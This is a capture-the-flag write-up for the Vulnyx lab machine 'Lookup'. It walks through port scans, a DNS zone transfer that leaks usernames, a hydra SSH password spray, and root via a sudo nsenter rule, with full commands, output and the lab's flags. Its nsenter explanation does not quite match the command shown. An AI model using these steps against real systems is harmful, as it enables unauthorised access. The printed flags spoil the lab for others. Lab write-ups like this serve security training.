# Vulnyx: Lookup

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `gobuster` · `dig` · `hydra` · `nsenter` |
| **Tags** | `#DNS` `#ZoneTransfer` `#InfoDisclosure` `#PasswordSpraying` `#ContainerEscape` |
| **URL** | https://vulnyx.com/machines/ |

A reverse DNS lookup on the box's own resolver reveals a second internal domain, and an unauthenticated zone transfer against it leaks a full list of employee usernames. Spraying that list against itself over SSH — testing each name as a possible password for every other — lands valid credentials, since one user's password turns out to just be a colleague's username. From there, a `sudo` rule around `nsenter` is enough to escalate to root.

## Enumeration
### Port Scanning

A full TCP port scan is run first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn lookup.nyx

PORT   STATE  SERVICE  REASON
22/tcp open   ssh      syn-ack ttl 64
53/tcp open   domain   syn-ack ttl 64
80/tcp open   http     syn-ack ttl 64
MAC Address: 08:00:27:30:39:FA (Oracle VirtualBox virtual NIC)
```

Three ports are found open: **22 (SSH)**, **53 (DNS)**, and **80 (HTTP)**. A version/script scan against all three fills in the details:

```bash
$ sudo nmap -p 22,53,80 -sCV lookup.nyx

PORT   STATE  SERVICE  VERSION
22/tcp open   ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 f7:ea:48:1a:a3:46:0b:bd:ac:47:73:e8:78:25:af:42 (RSA)
|   256 2e:41:ca:86:1c:73:ca:de:ed:b8:74:af:d2:06:5c:68 (ECDSA)
|_  256 33:6e:a2:58:1c:5e:37:e1:98:8c:44:31:c1:36:6d:75 (ED25519)
53/tcp open   domain   Eero device dnsd
| dns-nsid:
|_  bind.version: not currently available
80/tcp open   http     Apache httpd 2.4.38 ((Debian))
|_http-title: Under Construction
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:30:39:FA (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; Device: WAP; CPE: cpe:/o:linux:linux_kernel
```

A DNS service running on the box itself is worth enumerating directly, not just as a supporting service.

### Web Enumeration

The main page:

```
http://lookup.nyx
```
<img src="../Images/lookup/Pasted image 20260726232211.png"/>

```bash
$ gobuster dir -u 'http://lookup.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

=====================================================
Starting gobuster in directory enumeration mode
=====================================================
index.html            (Status: 200) [Size: 1519]
server-status          (Status: 403) [Size: 275]
Progress: 882232 / 882232 (100.00%)
=====================================================
Finished
=====================================================
```

### DNS Enumeration

A reverse lookup against the box's own IP, using its own resolver, is checked first:

```bash
$ dig -x <IP_Victim> @lookup.nyx

; <<>> DiG 9.20.24-1+b1-Debian <<>> -x <IP_Victim> @lookup.nyx
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 1080
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 1572d5ab59e65414e0b8cb106a6677feaa9381d36c06e50f (good)
;; QUESTION SECTION:
;60.2.0.10.in-addr.arpa.       IN      PTR

;; ANSWER SECTION:
60.2.0.10.in-addr.arpa. 86400  IN      PTR     ns1.silvertech.nyx.

;; AUTHORITY SECTION:
2.0.10.in-addr.arpa.   86400   IN      NS      ns1.silvertech.nyx.

;; ADDITIONAL SECTION:
ns1.silvertech.nyx.    86400   IN      A       <IP_Victim>

;; Query time: 0 msec
;; SERVER: lookup.nyx#53(lookup.nyx) (UDP)
;; WHEN: Sun Jul 26 17:11:24 EDT 2026
;; MSG SIZE  rcvd: 141
```

This surfaces a second domain — `silvertech.nyx` — hosted on the same DNS server. A zone transfer (`AXFR`) is attempted against it: this is a mechanism meant for secondary DNS servers to replicate an entire zone from the primary, and when it's not restricted to trusted hosts, anyone who asks gets the whole zone dumped back:

```bash
$ dig axfr silvertech.nyx @lookup.nyx

; <<>> DiG 9.20.24-1+b1-Debian <<>> axfr silvertech.nyx @lookup.nyx
;; global options: +cmd
silvertech.nyx.         86400   IN      SOA     ns1.silvertech.nyx. admin.silvertech.nyx. 1 36
00 1800 604800 86400
silvertech.nyx.         86400   IN      NS      ns1.silvertech.nyx.
ceo.silvertech.nyx.     86400   IN      TXT     "a.miller@silvertech.nyx"
finance.silvertech.nyx. 86400   IN      TXT     "b.clark@silvertech.nyx"
hr.silvertech.nyx.      86400   IN      TXT     "m.bailey@silvertech.nyx"
it.silvertech.nyx.      86400   IN      TXT     "p.logan@silvertech.nyx"
it.silvertech.nyx.      86400   IN      TXT     "j.carter@silvertech.nyx"
it.silvertech.nyx.      86400   IN      TXT     "r.turner@silvertech.nyx"
it.silvertech.nyx.      86400   IN      TXT     "s.hughes@silvertech.nyx"
ns1.silvertech.nyx.     86400   IN      A       <IP_Victim>
support.silvertech.nyx. 86400   IN      TXT     "p.hollen@silvertech.nyx"
www.silvertech.nyx.     86400   IN      A       <IP_Victim>
silvertech.nyx.         86400   IN      SOA     ns1.silvertech.nyx. admin.silvertech.nyx. 1 36
00 1800 604800 86400
;; Query time: 0 msec
;; SERVER: lookup.nyx#53(lookup.nyx) (TCP)
;; WHEN: Sun Jul 26 17:11:49 EDT 2026
;; XFR size: 13 records (messages 1, bytes 515)
```

The zone leaks a full list of usernames:

> **Users:** `a.miller`, `b.clark`, `m.bailey`, `p.logan`, `j.carter`, `r.turner`, `s.hughes`, `p.hollen`

## Initial Access

### Credential Reuse via SSH

Rather than a wordlist, the same username list is sprayed against itself — testing whether any user's password is simply another user's name:

```bash
$ hydra -L users.txt -P users.txt ssh://silvertech.nyx

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to red
uce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 64 login tries (l:8/p:8), ~4 tries per tas
k
[DATA] attacking ssh://silvertech.nyx:22/
[22][ssh] host: silvertech.nyx   login: m.bailey   password: b.clark
1 of 1 target successfully completed, 1 valid password found
```

> **Credentials:** `m.bailey:b.clark`

### Shell as m.bailey

```bash
$ ssh m.bailey@silvertech.nyx
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
m.bailey@silvertech.nyx's password:
Linux lookup 4.19.0-24-amd64 #1 SMP Debian 4.19.282-1 (2023-04-29) x86_64
m.bailey@lookup:~$ id
uid=1000(m.bailey) gid=1000(m.bailey) groups=1000(m.bailey)
```

```bash
m.bailey@lookup:~$ ls -l /home
total 4
drwx------ 3 m.bailey m.bailey 4096 Jul 18 18:25 m.bailey
m.bailey@lookup:~$ ls -l /home/m.bailey/
total 4
-r-------- 1 m.bailey m.bailey 33 Jul 18 18:25 user.txt
m.bailey@lookup:~$ cat /home/m.bailey/user.txt
523b7bc4fec097ffa533f66a1f830936
```

> **User flag:** `523b7bc4fec097ffa533f66a1f830936`

## Privilege Escalation

### `nsenter`

```bash
m.bailey@lookup:~$ sudo -l
Matching Defaults entries for m.bailey on lookup:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User m.bailey may run the following commands on lookup:
    (root) NOPASSWD: /usr/bin/nsenter
```

`nsenter` enters the namespaces of another running process. When `sudo` allows running it against PID 1 (the init process) with the host's mount, network, and PID namespaces, the effect is equivalent to stepping outside of any container isolation entirely — the resulting shell sees the host filesystem and process tree, not a restricted subset of it:

```bash
m.bailey@lookup:~$ sudo /usr/bin/nsenter /bin/sh -p
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -l /root
total 4
-r-------- 1 root root 33 Jul 18 18:37 root.txt
# cat /root/root.txt
d38cf53dd5e7f99c695bd4b0fdbe3985
```

> **Root flag:** `d38cf53dd5e7f99c695bd4b0fdbe3985`

## Takeaways

- A DNS server exposed on the target itself is worth querying directly — reverse lookups and zone transfer attempts can reveal internal domains and records that never show up in any web-based enumeration.
- An unrestricted `AXFR` zone transfer is effectively a full read of everything that domain's DNS server knows, useful far beyond just IP-to-hostname mappings — subdomains, mail records, and in this case, a list of real usernames.
- Password reuse across colleagues (one person's password matching another's username) is a realistic pattern worth testing for directly — spraying a leaked user list against itself is often more effective than a generic wordlist.
- `nsenter` granted through `sudo` is a container/namespace escape primitive by design, not a coincidental misconfiguration — its entire purpose is crossing the boundary it's normally used to inspect.